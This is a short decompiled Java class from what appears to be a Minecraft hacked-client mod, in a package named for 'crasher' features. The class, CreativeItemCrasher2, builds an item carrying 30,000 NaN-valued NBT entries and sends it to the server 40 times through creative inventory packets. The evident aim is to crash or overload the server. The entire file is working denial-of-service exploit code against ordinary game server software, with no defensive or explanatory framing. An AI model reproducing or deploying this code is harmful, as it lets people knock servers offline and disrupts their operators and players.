// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.cic;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.item.ItemStack;
import net.minecraft.block.Block;

public class CreativeItemCrasher2
{
    public static void start() {
        final ItemStack itm = new ItemStack(Block.getBlockById(1));
        final NBTTagCompound base = new NBTTagCompound();
        for (int i = 0; i < 30000; ++i) {
            base.setDouble(String.valueOf(i), Double.NaN);
        }
        itm.setTagCompound(base);
        for (int i = 0; i < 40; ++i) {
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCreativeInventoryAction(i, itm));
        }
    }
}
